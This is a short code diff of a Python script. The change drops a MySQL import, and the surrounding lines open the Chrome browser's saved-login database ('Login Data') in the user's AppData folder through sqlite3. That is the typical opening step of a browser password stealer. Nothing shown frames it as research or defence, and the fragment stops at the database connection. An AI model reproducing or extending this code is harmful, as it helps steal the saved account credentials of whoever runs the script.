@@ -2,7 +2,6 @@
 from os import getenv
 import sqlite3
 import hashlib
-import MySQLdb
 
 conn = sqlite3.connect(getenv("APPDATA")+r"\..\Local\Google\Chrome\User Data\Default\Login Data")
 connection = conn.cursor()
